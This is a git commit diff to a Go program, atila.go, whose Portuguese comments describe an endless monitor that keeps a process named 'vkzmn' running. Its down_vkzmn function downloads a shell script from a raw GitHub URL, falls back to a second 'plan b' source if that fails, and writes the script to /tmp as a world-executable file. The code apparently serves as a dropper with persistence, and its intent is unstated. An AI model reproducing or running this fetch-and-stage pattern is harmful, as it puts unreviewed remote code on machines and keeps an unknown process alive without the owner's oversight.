c37c6cc56ba947b4c983f5b6b394eeca47fafdbd
root <atilalima569@gmail.com>
2026-07-25 16:23:16 -0500

    ok

--- atila.go
+++ atila.go
@@ -12,6 +12,8 @@ import (
         "os/exec"
 )
 
+
+
 //esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao
 
 func exec_vkzmn() {
@@ -24,52 +26,27 @@ func exec_vkzmn() {
 
 
 func down_vkzmn()  {
-
-
-
 fmt.Println("abaixando vkzmn")
-
-
 cli := http.Client{}
-
 resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/down.sh")
-
  if err_get != nil {
-
  fmt.Println(err_get)  //erro no github.com 
  
-       
-      down_raw() // call  plane b
+     down_raw() // call  plane b
 
            return
-
-
-     }
+   }
 
  
-
 script  , err_readall :=  ioutil.ReadAll(resp.Body) 
-
-  
-     if err_readall  != nil {
-
+   if err_readall  != nil  {
        fmt.Println("erro em readall")
-
            down_raw() 
-
            return 
-
-         
      
-        }
-
-
+            }
 ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
  
-  
-
-
-
 }
 
 
